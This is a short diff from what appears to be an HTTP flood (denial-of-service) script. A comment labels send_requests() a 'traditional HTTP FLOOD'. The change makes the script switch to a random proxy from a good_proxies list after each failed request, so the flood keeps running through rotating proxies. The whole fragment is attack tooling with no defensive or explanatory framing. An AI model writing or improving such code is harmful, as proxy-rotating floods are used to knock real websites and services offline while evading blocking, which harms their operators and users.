@@ -441,8 +441,12 @@ def send_requests(): #傳統HTTP FLOOD
             except:
                 print(f"[DPF]->proxy: \033[35;1m{proxy_ip}:{proxy_port}\033[0m request \033[31;1mFailed\033[0m")
                 s.close()
+                proxy_ip, proxy_port = random.choice(good_proxies).split(":")
+                proxy_port = int(proxy_port)
         except:
             s.close()
+            proxy_ip, proxy_port = random.choice(good_proxies).split(":")
+            proxy_port = int(proxy_port)
 
 
 if __name__ == '__main__':
